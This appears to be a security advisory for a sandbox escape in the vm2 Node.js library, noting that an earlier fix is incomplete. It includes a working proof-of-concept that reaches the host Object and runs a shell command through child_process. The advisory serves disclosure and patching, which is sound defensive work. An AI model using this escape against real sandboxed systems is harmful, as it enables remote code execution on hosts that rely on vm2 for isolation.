summary: "vm2 Access to Host Object Enables Sandbox Escape\n### Summary\n\nIt is possible to\
  \ obtain the host `Object`, https://github.com/patriksimek/vm2/commit/ebcfe94ad2f864f0bc35e78cff1d921107cfd160\
  \ added some protections, but the implementation is incomplete.\n\n### Details\n\nThere are\
  \ various ways to use the host `Object`, to escape the sandbox, one example would be using\
  \  `HostObject.getOwnPropertySymbols` to obtain `Symbol(nodejs.util.inspect.custom)`\n\n###\
  \ PoC\n\n```js\nconst g = {}.__lookupGetter__;\nconst a = Buffer.apply;\nconst p = a.apply(g,\
  \ [Buffer, ['__proto__']]);\nconst o = p.call(p.call(a));\nconst HObject = o.constructor;\n\
  sym = HObject.getOwnPropertySymbols(Buffer.prototype).at(0);\n\nconst obj = {\n\t[sym]: (depth,\
  \ opt, inspect) => {\n\t\tinspect.constructor(\"return process.getBuiltinModule('child_process').execSync('ls',{stdio:'inherit'})\"\
  )();\n\t},\n\tvalueOf: undefined,\n\tconstructor: undefined,\n};\n\nWebAssembly.compileStreaming(obj).catch(()\
  \ => {});\n```\n\n### Impact\n\nSandbox Escape -> RCE"
